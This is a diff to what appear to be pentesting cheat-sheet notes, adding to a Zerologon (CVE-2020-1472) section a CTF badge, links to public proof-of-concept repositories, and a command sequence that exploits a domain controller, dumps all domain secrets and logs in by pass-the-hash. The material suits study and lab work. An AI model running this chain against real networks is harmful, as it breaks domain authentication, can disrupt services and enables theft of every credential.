@@ -821,11 +821,24 @@ $ python3 getnthash.py -key <from gettgt> example.com\COMPUTE_ACCOUNT_NAME\$
 
 #### Zerologon
 
+[![windows_zerologon](../../../../cybersecurity/_badges/rootme/realist/windows_zerologon.svg)](https://www.root-me.org/fr/Challenges/Realiste/Windows-ZeroLogon)
+
 ZeroLogon is a harmful unauthenticated vulnerability that can be used to authenticate as any user as long as we can reach the DC.
 
 NetLogon uses AES with a null IV. When the nonce sent by the user is a block of zeros, then the session key may result all-zero ciphertext <small>(1/256, one session key is starting with 0)</small> allowing us to bypass authentication. We can then reset the DC password <small>(may lead to service disruptions)</small> and perform a DC sync to dump all secrets.
 
+* [PoC by SecuraBV](https://github.com/SecuraBV/CVE-2020-1472) <small>(1.7k ⭐)</small>
+* [PoC by dirkjanm](https://github.com/dirkjanm/CVE-2020-1472) <small>(1.2k ⭐)</small>
 * [PoC by risksense](https://github.com/risksense/zerologon) <small>(0.6k ⭐)</small>
+
+```shell!
+$ git clone https://github.com/SecuraBV/CVE-2020-1472.git SecuraBV
+$ python SecuraBV/zerologon_tester.py DC01 IP
+$ git clone https://github.com/dirkjanm/CVE-2020-1472.git dirkjanm
+$ python dirkjanm/cve-2020-1472-exploit.py DC01 IP
+$ impacket-secretsdump -no-pass -just-dc EXAMPLE.COM/'DC01$'@IP
+$ impacket-smbclient -no-pass EXAMPLE.COM/'DC01$'@IP  -hashes aad3b435b51404eeaad3b435b51404ee:777b1935ff37faba2b2c299288b0693b
+```
 </div></div>
 
 <hr class="sep-both">
